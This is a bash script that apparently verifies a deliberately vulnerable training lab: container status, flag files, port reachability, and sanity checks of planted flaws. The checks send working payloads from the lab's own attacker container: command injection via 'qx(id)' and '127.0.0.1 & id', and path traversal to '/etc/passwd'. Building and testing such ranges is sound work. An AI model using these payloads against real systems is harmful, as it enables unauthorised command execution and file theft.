#!/bin/bash

echo "=== Lab Verification Report ==="
echo "Generated at: $(date)"
echo ""

# Container status check
echo "--- 1. Container Status ---"
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
echo ""

# Flag verification in /opt/flag.txt
echo "--- 2. Flag Verification (/opt/flag.txt) ---"
for i in {1..7}; do
    container="server-$i"
    echo -n "$container: "
    docker exec "$container" cat /opt/flag.txt 2>/dev/null || echo "MISSING"
done
echo -n "server-db: "
docker exec server-db cat /opt/flag.txt 2>/dev/null || echo "FAILED (MySQL Base)"
echo ""

# Internal Connectivity and Service Check (from server-6)
echo "--- 3. Service Reachability Check ---"
docker exec server-6 bash -c '
    echo "Check server-1 (22, 80):"
    nc -zv server-1 22 80 2>&1 | grep succeeded
    echo "Check server-2 (80, 445):"
    nc -zv server-2 80 445 2>&1 | grep succeeded
    echo "Check server-3 (80, 3306, 9200):"
    nc -zv server-3 80 3306 9200 2>&1 | grep succeeded
    echo "Check server-4 (3000, 6379):"
    nc -zv server-4 3000 6379 2>&1 | grep succeeded
    echo "Check server-5 (22, 80):"
    nc -zv server-5 22 80 2>&1 | grep succeeded
'

# Vulnerability Check (Quick sanity)
echo ""
echo "--- 4. Vulnerability Sanity Check ---"
echo -n "Server 2 RCE (Perl): "
docker exec server-6 curl -s "http://server-2/index.pl?page=calculator&expr=qx(id)" | grep -q "uid=" && echo "WORKING" || echo "FAILED"
echo -n "Server 3 RCE (Go): "
docker exec server-6 curl -s -X POST -d "type=ping&target=127.0.0.1%20%26%20id" http://server-3/diagnostics | grep -q "uid=" && echo "WORKING" || echo "FAILED"
echo -n "Server 5 Traversal: "
docker exec server-6 curl -s "http://server-5/download?file=../../../../etc/passwd" | grep -q "root:x:0:0" && echo "WORKING" || echo "FAILED"

echo ""
echo "=== Verification Done ==="
